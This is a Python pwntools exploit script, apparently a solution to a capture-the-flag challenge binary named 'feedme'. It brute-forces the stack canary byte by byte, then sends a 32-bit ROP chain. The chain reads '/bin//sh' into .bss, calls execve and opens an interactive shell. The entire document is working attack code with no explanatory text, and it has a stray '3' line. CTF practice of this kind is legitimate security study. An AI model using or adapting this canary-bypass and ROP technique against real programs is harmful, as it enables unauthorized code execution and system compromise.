from pwn import *
  
p = process("./feedme")



e = ELF("./feedme")



canary = ""

p.recvuntil("FEED ME!\n")

for j in range(0,4):

    for i in range(0,256):

        payload = "A"*0x20+canary+chr(i)

        p.send(chr(len(payload)))

        p.send(payload)

        result = p.recvuntil(b"FEED ME!\n")

        if not b"stack smashing detected" in result:

            canary += chr(i)

            print(canary)

            break

print("Canary = " + canary)
3
canary = bytes(canary, 'utf-8')

syscall = 0x0806fa1e

par = 0x080bb496

pcpbr = 0x0806f371

pdr = 0x0806f34a

bss = e.bss()

binsh = "/bin//sh"

payload = b"A"*0x20

payload += canary

payload += b"A"*12

payload += p32(par)

payload += p32(0x3)

payload += p32(pcpbr)

payload += p32(bss)

payload += p32(0)

payload += p32(pdr)

payload += p32(len(binsh))

payload += p32(syscall)



payload += p32(par)

payload += p32(0xb)

payload += p32(pcpbr)

payload += p32(0)

payload += p32(bss)

payload += p32(pdr)

payload += p32(0)

payload += p32(syscall)





p.send(chr(len(payload)))

p.send(payload)

p.send(binsh)

p.interactive()
